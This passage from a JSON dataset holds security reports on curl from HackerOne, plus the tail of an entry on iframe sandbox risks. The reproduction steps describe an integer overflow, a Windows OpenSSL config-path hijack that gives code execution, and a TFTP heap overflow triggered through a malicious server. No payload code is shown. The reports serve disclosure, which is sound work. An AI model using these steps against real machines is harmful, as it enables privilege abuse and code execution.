An anchor tag targeting different browser levels will not execute.\nUnique origin treatment. All content is treated under a unique origin. The content is not able to traverse the DOM or read cookie information.\n\nWhen the sandbox attribute is not set or not configured correctly, your application might be at risk.\n\nA compromised website that is loaded in such an insecure iframe might affect the parent web application. These are just a few examples of how such an insecure frame might affect its parent:\nIt might trick the user into supplying a username and password to the site loaded inside the iframe.\nIt might navigate the parent window to a phishing page.\nIt might execute untrusted code.\nIt could show a popup, appearing to come from the parent site.\n\nSandbox containing a value of :\nallow-same-origin will not treat it as a unique origin.\nallow-top-navigation will allow code in the iframe to navigate the parent somewhere else, e.g. by changing parent.location.\nallow-forms will allow form submissions from inside the iframe.\nallow-popups will allow popups.\nallow-scripts will allow malicious script execution however it won't allow to create popups."
},
{
    "url": "https://hackerone.com/reports/591770",
    "original_report": "Summary:\n--------\n\nGood afternoon curl security! I built this curl from commit 8144ba38c383718355d8af2ed8330414edcbbc83. We discovered a signed integer overflow in tool\\_progress\\_cb().\n\nSteps To Reproduce:\n-------------------\n\nCompiled with the Undefined Behavior Sanitizer enabled. Ran with the following command line:\n`./curl -q -# -T- -C- file:///dev/null`\n\nSupporting Material/References:\n-------------------------------\n\nImpact\n------\n\nAn integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc."
},
{
    "url": "https://hackerone.com/reports/608577",
    "original_report": "Summary:\n--------\n\nThe curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\\usr\\local\\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.\n\nVersion tested.\ncurl-7.65.1\\_1-win64\n\nOS:\nWindows 10\n\nSteps To Reproduce:\n-------------------\n\nAll steps are executed as a low privileged(non-admin) user unless otherwise noted\n\n1. As a low privileged user create the following folder c:\\usr\\local\\ssl\n\n2. Create an openssl.cnf file with the following contents.\n\n3. Create the c:\\stage folder\n\n4. Create and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator."
},
{
    "url": "https://hackerone.com/reports/550696",
    "original_report": "Summary:\n--------\n\nA heap buffer overflow can occur at line 1114 in file `lib/tftp.c` due to the fact of `state->blksize` containing the default size instead of containing the one specified in the `--tftp-blksize` parameter.\n\nThis bug could lead to a **crash** or maybe to **RCE** in the case the attacker also had a memory leak.\n\n### Vulnerable line:\n\nSteps To Reproduce:\n-------------------\n\n1. Download the server script\n2. Run it and bind to an address: `$ python evil-server.py IP PORT`\n3. Connect to that server with curl: `$ curl --tftp-blksize N tftp://IP:PORT`\n   Where **N** should be a number lower than 293.\n\nImpact\n------\n\n* An attacker would also need a memory leak in order to gain full RCE.\n* The victim should explicitly set the `--blksize` argument to a value inferior to 293.\n\nThus, the impact is not very high but it's still quite dangerous to not release a patch."
},
{
    "url": "https://hackerone.com/reports/545052",
    "original_report": "Hey Curl,\n\nGithub wiki on the following project,\n\n<https://github.com/curl/curl/wiki>\n\ncan be edited by any logged in user in the system. This poses security and reputation risk for the company.\nAs your policy i doesnot edited any of the wiki :-)\n\nRegards,\n[@MSRC29](/msrc29)\n\nImpact\n------\n\nAs wikis listed above can be edited by any person on the internet, a malicious actor can accurately craft a message or a note which would lead a user to download a malicious component in a natural way.\n\nThe user would surely trust the code (of course if he trusts the company itself), so he will extrapolate this trust to the wiki and consider it being safe enough to follow the instructions and downloading himself a malware."
}
]